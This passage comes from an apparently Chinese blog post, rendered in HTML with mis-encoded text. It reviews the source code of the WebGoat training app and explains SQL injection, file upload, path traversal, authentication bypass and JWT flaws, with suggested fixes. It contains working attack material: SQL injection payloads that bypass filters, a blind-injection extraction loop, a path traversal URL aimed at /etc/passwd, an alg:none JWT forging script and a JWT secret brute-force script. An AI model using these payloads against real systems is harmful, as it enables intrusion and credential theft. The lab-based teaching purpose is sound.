class="keyword">in</span> resp.json()[<span class="number">0</span>][<span class="string">&#x27;hostname&#x27;</span>]:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">if</span> temp == result:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;select * from table where </span></span><br><span class="line"><span class="string">column = </span></span><br><span class="line"><span class="string">case</span></span><br><span class="line"><span class="string">when (select substr(ip,&#123;0&#125;,1) = &#x27;&#123;1&#125;&#x27; from server where  hostname = &#x27;webgoat-prd&#x27;)</span></span><br><span class="line"><span class="string">then hostname</span></span><br><span class="line"><span class="string">else mac end&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="sql12.png" alt=""></p></li><li><p>sql-injectionâ€“&gt;SqlOnlyInputValidation</p><p>é™åˆ¶ç”¨æˆ·è¾“å…¥å†…å®¹ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è¿‡ /**/ æ³¨é‡Šï¼Œæ‹¬å·ç­‰ç»•è¿‡ï¼Œè¿‡æ»¤ç©ºæ ¼åç›´æ¥è°ƒç”¨ SQLInjectionLesson6a çš„æ³¨å…¥å‡½æ•°ï¼ˆå­—ç¬¦æ‹¼æ¥æ‰§è¡Œå¹¶ç›´æ¥è¾“å‡ºç»“æœï¼‰ï¼Œä¿®å¤å»ºè®®åŒ SQLInjectionLesson6a</p><p><img src="sql5.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/from/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure><p><img src="sql10.png" alt=""></p></li><li><p>sql-injectionâ€“&gt;SqlOnlyInputValidationOnKeywords</p><p>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå…³é”®å­—â€™selectâ€™ 'fromâ€™è¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­ç½®ç©ºï¼Œå¹¶é™åˆ¶ç”¨æˆ·è¾“å…¥ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡åŒå†™ + æ³¨é‡Šç»•è¿‡ç»•è¿‡ï¼Œå»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘</p><p><img src="sql6.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/frfromom/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure><p><img src="sql11.png" alt=""></p></li></ol><h1 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ ">#</a> ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><h2 id="æ¼æ´æè¿°-2"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-2">#</a> æ¼æ´æè¿°</h2><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å…è®¸ç”¨æˆ·å°†æœ¬åœ°çš„æ–‡ä»¶é€šè¿‡ Web é¡µé¢æäº¤åˆ°ç½‘ç«™æœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å¦‚æœä¸å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œåˆ™æ”»å‡»è€…å¯åˆ©ç”¨ Web åº”ç”¨ç³»ç»Ÿæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼ˆå¦‚æ–‡ä»¶ä¸Šä¼ ã€å›¾åƒä¸Šä¼ ç­‰ï¼‰çš„ä»£ç ç¼ºé™·æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶æˆ–è€… webshellï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œä»¥è¾¾åˆ°è·å– Web åº”ç”¨ç³»ç»Ÿæ§åˆ¶æƒé™æˆ–å…¶ä»–ç›®çš„ã€‚</p><h2 id="æ¼æ´æˆå› -2"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -2">#</a> æ¼æ´æˆå› </h2><p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-2"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-2">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><ol><li><p>path-traversalâ€“&gt;ProfileUpload</p><p>è·å–å‰ç«¯ä¸Šä¼ çš„æ–‡ä»¶ä»¥åŠå­—ç¬¦ä¸² â€œfullNameâ€</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/PathTraversal/profile-upload&quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line"> <span class="meta">@ResponseBody</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> AttackResult <span class="title">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFile&quot;)</span> MultipartFile file, <span class="meta">@RequestParam(value = &quot;fullName&quot;, required = false)</span> String fullName)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">super</span>.execute(file, fullName);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çˆ¶ç±» ProfileUploadBaseï¼Œexecute () æ–¹æ³•ï¼Œåˆ¤æ–­æ–‡ä»¶å’Œ &quot;fullName&quot; éç©ºåç›´æ¥ä¸Šä¼ ï¼Œå¹¶ä¸” â€œfullNameâ€ ç”¨ä½œå­è·¯å¾„åå­—ç¬¦ä¸²</p><p><img src="sql7.png" alt=""></p><p>ä¿®å¤å»ºè®®</p><ol><li>å¯¹ fullName è¿›è¡Œåˆ¤æ–­è¿‡æ»¤</li><li>ä½¿ç”¨é€‚å½“çš„æƒé™ä¿æŠ¤æ–‡ä»¶å¤¹</li><li>éšæœºåŒ–é‡å‘½åç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å</li><li>æ ¹æ®ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹é‡æ„æ–‡ä»¶</li></ol><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt01.png" alt=""><img src="pt02.png" alt=""></p><ol start="2"><li>path-traversalâ€“&gt;ProfileUploadFix</li></ol><p>å¯¹ â€œfullNameâ€ è¿‡æ»¤äº† â€œâ€¦/â€ï¼Œä½†æ˜¯å› ä¸º replace å¹¶ä¸èƒ½é€’å½’æ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åŒå†™ç»•è¿‡ (â€™â€¦/./â€™)ï¼Œä¿®å¤å»ºè®®åŒä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> AttackResult <span class="title">uploadFileHandler</span><span class="params">(            <span class="meta">@RequestParam(&quot;uploadedFileFix&quot;)</span> MultipartFile file,            <span class="meta">@RequestParam(value = &quot;fullNameFix&quot;, required = false)</span> String fullName)</span> </span>&#123;        <span class="keyword">return</span> <span class="keyword">super</span>.execute(file, fullName != <span class="keyword">null</span> ? fullName.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>) : <span class="string">&quot;&quot;</span>);    &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt03.png" alt=""></p><p><img src="pt04.png" alt=""></p><ol start="3"><li>path-traversalâ€“&gt;ProfileUploadRemoveUserInput</li></ol><p>ç›´æ¥ä½¿ç”¨äº†æºæ–‡ä»¶åï¼Œæ‰€ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶åå³å¯ï¼Œå»ºè®®éšæœºé‡å‘½åæ–‡ä»¶å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> AttackResult <span class="title">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFileRemoveUserInput&quot;)</span> MultipartFile file)</span> </span>&#123;        <span class="keyword">return</span> <span class="keyword">super</span>.execute(file, file.getOriginalFilename());    &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt05.png" alt=""></p><p><img src="pt06.png" alt=""></p><h1 id="ç›®å½•éå†"><a class="markdownIt-Anchor" href="#ç›®å½•éå†">#</a> ç›®å½•éå†</h1><h2 id="æ¼æ´æè¿°-3"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-3">#</a> æ¼æ´æè¿°</h2><p>è·¯å¾„éå†ï¼Œå³åˆ©ç”¨è·¯å¾„å›æº¯ç¬¦ â€œâ€¦/â€ è·³å‡ºç¨‹åºæœ¬èº«çš„é™åˆ¶ç›®å½•å®ç°ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚ä¾‹å¦‚ Web åº”ç”¨æºç ç›®å½•ã€Web åº”ç”¨é…ç½®æ–‡ä»¶ã€æ•æ„Ÿçš„ç³»ç»Ÿæ–‡ä»¶ï¼ˆ/etc/passwdã€/etc/paswdï¼‰ç­‰ã€‚</p><p>ä¸€ä¸ªæ­£å¸¸çš„ Web åŠŸèƒ½è¯·æ±‚ï¼š</p><p><a href="http://www.test.com/get-files.jsp?file=report.pdf">http://www.test.com/get-files.jsp?file=report.pdf</a></p><p>å¦‚æœ Web åº”ç”¨å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ„é€ ä»¥ä¸‹è¯·æ±‚æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ï¼š</p><p><a href="http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd">http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd</a></p><h2 id="æ¼æ´æˆå› -3"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -3">#</a> æ¼æ´æˆå› </h2><p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-3"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-3">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><p>path-traversalâ€“&gt;ProfileUploadRetrieval</p><p>æºç è¿‡æ»¤äº†â€™â€¦â€˜å’Œâ€™/â€™ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ url ç¼–ç è¿›è¡Œç»•è¿‡</p><p>æ ¹æ®å‚æ•° id è¿›è¡Œåˆ¤æ–­</p><p><img src="pt08.png" alt=""></p><p>å¦‚æœç”¨æˆ·è¾“å…¥çš„ id.jpg å­˜åœ¨ï¼Œé‚£ä¹ˆè¿”å›åŒ…ä¸­è¿”å›è¯¥å›¾ç‰‡çš„ base64 ç¼–ç </p><p>å¦‚æœä¸å­˜åœ¨ï¼Œå°±è¿”å› catPicturesDirectory çš„çˆ¶ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œç”¨é€—å·åˆ†å‰²</p><p><img src="pt09.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt07.png" alt=""></p><p>ä¿®å¤å»ºè®®ï¼š</p><pre><code>1. ä½¿ç”¨é€‚å½“çš„æƒé™ä¿æŠ¤æ–‡ä»¶å¤¹2. ç¦æ­¢è¿”å›ç›®å½•ä¿¡æ¯3. å¯¹urlç¼–ç åçš„å‚æ•°ä¹Ÿè¦è¿›è¡Œè§£ç è¿‡æ»¤4. ç»Ÿä¸€404ç•Œé¢</code></pre><h1 id="èº«ä»½è®¤è¯ç»•è¿‡"><a class="markdownIt-Anchor" href="#èº«ä»½è®¤è¯ç»•è¿‡">#</a> èº«ä»½è®¤è¯ç»•è¿‡</h1><h2 id="æ¼æ´æè¿°-4"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-4">#</a> æ¼æ´æè¿°</h2><p>ä¸šåŠ¡æµç¨‹ç”±å‰ç«¯è¿›è¡Œæ§åˆ¶ï¼ŒæœåŠ¡å™¨ç«¯å¯¹åº”çš„å„åŠŸèƒ½åˆ†ç¦»ï¼Œå¯¼è‡´ä¸šåŠ¡æµç¨‹å¯è¢«æ”»å‡»è€…è¿›è¡Œæ§åˆ¶ï¼Œä»è€Œç»•è¿‡æµç¨‹ä¸­çš„å„é¡¹æ ¡éªŒåŠŸèƒ½ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p><h2 id="æ¼æ´æˆå› -4"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -4">#</a> æ¼æ´æˆå› </h2><p>æœªå¯¹ç”¨æˆ·å¯æ§çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§éªŒè¯</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-4"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-4">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><ol><li><p>auth-bypassâ€“&gt;VerifyAccount.completed()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &#123;            <span class="keyword">return</span> failed(<span class="keyword">this</span>)                    .feedback(<span class="string">&quot;verify-account.cheated&quot;</span>)                    .output(<span class="string">&quot;Yes, you guessed correctly, but see the feedback message&quot;</span>)                    .build();        &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ verificationHelper.didUserLikelylCheat ()</p><p>å°†ç”¨æˆ·è¾“å…¥çš„é—®é¢˜ç”¨é”®å€¼å¯¹çš„æ–¹å¼ä¿å­˜ï¼Œå¹¶å’Œåç«¯ä»£ç å­˜å‚¨çš„ç­”æ¡ˆè¿›è¡Œæ¯”è¾ƒã€‚</p><p>ä½†æ˜¯ Mapper åœ¨ get ä¸€ä¸ªä¸å­˜åœ¨çš„é”®æ—¶ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯è¿”å› nullã€‚æ‰€ä»¥ç”¨æˆ·å¯ä»¥é€šè¿‡æ§åˆ¶ key çš„å€¼ç»•è¿‡ã€‚</p><p>å»ºè®®</p><ol><li>è‹¥ç”¨æˆ·å¯æ§ keyï¼Œé‚£ä¹ˆåº”è¯¥å…ˆåˆ¤æ–­è¿™ä¸ª key æ˜¯å¦åˆæ³•</li><li>è®¾ç½®ä¸å¯æ§ keyï¼Œç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸º value è¿›è¡Œåˆ¤æ–­</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;        userSecQuestions.put(<span class="string">&quot;secQuestion0&quot;</span>, <span class="string">&quot;Dr. Watson&quot;</span>);        userSecQuestions.put(<span class="string">&quot;secQuestion1&quot;</span>, <span class="string">&quot;Baker Street&quot;</span>);    &#125;    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer, Map&gt; secQuestionStore = <span class="keyword">new</span> HashMap&lt;&gt;();    <span class="keyword">static</span> &#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &#125;    <span class="comment">// end &#x27;data store set up&#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &#x27;vulnerable&#x27; code    public boolean didUserLikelylCheat(HashMap&lt;String, String&gt; submittedAnswers) &#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123;            likely = true;        &#125;        if ((submittedAnswers.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)))                &amp;&amp; (submittedAnswers.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;)))) &#123;            likely = true;        &#125; else &#123;            likely = false;        &#125;        return likely;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="ap01.png" alt=""></p></li><li><p>auth-bypassâ€“&gt;AccountVerificationHelper.verifyAccount()</p><p>åˆ¤æ–­äº† key æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯ä¸åŒ…å«è¯¥ key ä»ç„¶å¯ä»¥ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&lt;String, String&gt; submittedQuestions) &#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;))) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return false;        &#125;        // else        return true;    &#125;</span></span><br></pre></td></tr></table></figure><p>å»ºè®®ä¿®æ”¹ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            <span class="keyword">return</span> <span class="keyword">false</span>;        &#125;<span class="comment">// åŒæ—¶åˆ¤æ–­keyå’Œå¯¹åº”çš„value        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)) &amp;&amp; submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return true;        &#125;        // else        return false;</span></span><br></pre></td></tr></table></figure><p>ä½œè€…æ²¡å†™è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œå°±æ˜¯åœ¨æºç é‡Œé¢é—®äº†ä¸€ä¸‹</p></li><li><p>JWT</p><p>jwtâ€“&gt;JWTVotesEndpoint.vote()</p><p>æ²¡æœ‰éªŒè¯ç­¾åï¼Œç›´æ¥åˆ¤æ–­ token ä¸­çš„ admin å¯¹åº”å€¼æ˜¯å¦ä¸º trueï¼Œæ‰€ä»¥æŠŠ token ä¸­çš„ alg è®¾ç½®ä¸º noneï¼Œadmin è®¾ç½®ä¸º true å³å¯ï¼ˆäº²æµ‹ bp è½¬æ¢çš„ä¸è¡Œï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtils.isEmpty(accessToken)) &#123;            <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build();        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">try</span> &#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                <span class="keyword">boolean</span> isAdmin = Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));                <span class="keyword">if</span> (!isAdmin) &#123;                    <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;jwt-only-admin&quot;</span>).build();                &#125; <span class="keyword">else</span> &#123;                    votes.values().forEach(vote -&gt; vote.reset());                    <span class="keyword">return</span> success(<span class="keyword">this</span>).build();                &#125;            &#125; <span class="keyword">catch</span> (JwtException e) &#123;                <span class="keyword">return</span> failed(<span class="keyword">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure><p>è½¬æ¢è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-import jwtimport base64# header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\/\/demo.sjoerdlangkemper.nl\/&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&#x27;+&#x27;, b&#x27;-&#x27;).replace(b&#x27;/&#x27;, b&#x27;_&#x27;).replace(b&#x27;=&#x27;, b&#x27;&#x27;)print(b64urlencode(b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;)+b&#x27;.&#x27;+b64urlencode(b&#x27;&#123;&quot;iat&quot;:1673470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;&#x27;)+b&#x27;.&#x27;)</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt10.png" alt=""></p><p>jwtâ€“&gt;JWTSecretKeyEndpoint.login()</p><p>éšæœºå–æ•°ç»„ä¸­çš„å€¼è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥ç”¨å­—å…¸è¿›è¡Œçˆ†ç ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] SECRETS = &#123;<span class="string">&quot;victory&quot;</span>, <span class="string">&quot;business&quot;</span>, <span class="string">&quot;available&quot;</span>, <span class="string">&quot;shipping&quot;</span>, <span class="string">&quot;washington&quot;</span>&#125;;<span class="keyword">static</span> <span class="keyword">final</span> String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[<span class="keyword">new</span> Random().nextInt(SECRETS.length)]);<span class="function"><span class="keyword">public</span> String <span class="title">getSecretToken</span><span class="params">()</span> </span>&#123;        <span class="keyword">return</span> Jwts.builder()                .setIssuer(<span class="string">&quot;WebGoat Token Builder&quot;</span>)                .setAudience(<span class="string">&quot;webgoat.org&quot;</span>)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(<span class="number">60</span>)))                .setSubject(<span class="string">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;Tom&quot;</span>)                .claim(<span class="string">&quot;Email&quot;</span>, <span class="string">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class="string">&quot;Role&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;Manager&quot;</span>, <span class="string">&quot;Project Administrator&quot;</span>&#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &#125;</span><br></pre></td></tr></table></figure><p>çˆ†ç ´è„šæœ¬ï¼ˆå­—å…¸ pass.txt ç”¨çš„æ˜¯æºç é‡Œé¢çš„æ•°ç»„ï¼‰ï¼ˆå¦‚æœè„šæœ¬æŠ¥é”™ jwt æ‰¾ä¸åˆ° jwt.exceptionsï¼Œå¯èƒ½æ˜¯ pyjwt çš„é—®é¢˜ï¼Œæ›´æ–° pyjwt&gt;=1.6.4 å³å¯ï¼Œ<a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">è§£å†³æ¥æº</a>ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> termcolorimport jwtif __name__ == <span class="string">&quot;__main__&quot;</span>:    jwt_str = <span class="string">&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&#x27;</span>    <span class="function">with <span class="title">open</span><span class="params">(<span class="string">&#x27;pass.txt&#x27;</span>)</span> as f:        <span class="keyword">for</span> line in f:            key_ </span>= line.strip()            <span class="keyword">try</span>:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=<span class="string">&quot;HS256&quot;</span>)                print(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)                <span class="function"><span class="keyword">break</span>            <span class="title">except</span> <span class="params">(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)</span>:                <span class="title">print</span><span class="params">(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>)</span>, &#x27;&lt;--&#x27;)                <span class="keyword">break</span>            except jwt.exceptions.InvalidSignatureError:                <span class="title">print</span><span class="params">(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=True)</span>                <span class="keyword">continue</span>        <span class="keyword">else</span>:            <span class="title">print</span><span class="params">(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt12.png" alt=""></p><p>çˆ†ç ´å‡ºæ¥ keyï¼Œå°±å¯ä»¥å» https://jwt.io/#debugger åŠ å·¥å•¦</p><p><img src="pt13.png" alt=""></p><p>jwtâ€“&gt;JWTRefreshEndpoint</p><p>ç™»å½•æ—¶è°ƒç”¨ createNewTokens ()</p><p>ä¼šè·å–åˆ°çš„ refresh token å’Œè¯¥ç”¨æˆ·çš„ access token</p><p>refresh token æ˜¯é€šè¿‡ RandomStringUtils.randomAlphabetic (20) è·å–çš„éšæœºå€¼ï¼Œç”¨äºåˆ·æ–°è¿‡æœŸçš„ access token</p><p>ä½†æ˜¯ç”±äºæ²¡æœ‰ç»‘å®šç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥åˆ·æ–°ä»»ä½•ä»»ä½•ç”¨æˆ·çš„è¿‡æœŸ token</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; tokenJson = <span class="keyword">new</span> HashMap&lt;&gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(<span class="number">20</span>);        validRefreshTokens.add(refreshToken);        tokenJson.put(<span class="string">&quot;access_token&quot;</span>, token);        tokenJson.put(<span class="string">&quot;refresh_token&quot;</span>, refreshToken);        <span class="keyword">return</span> tokenJson;</span><br></pre></td></tr></table></figure><p>token åˆ·æ–°ï¼Œè¯·æ±‚åŒ…ä¸­çš„ refresh_token è¢«åŒ…å«åœ¨éšæœºç”Ÿæˆçš„ token é›†åˆä¸­æ—¶ï¼Œå°±è¿”å›ä¸€ä¸ªæ–°çš„ tokenï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 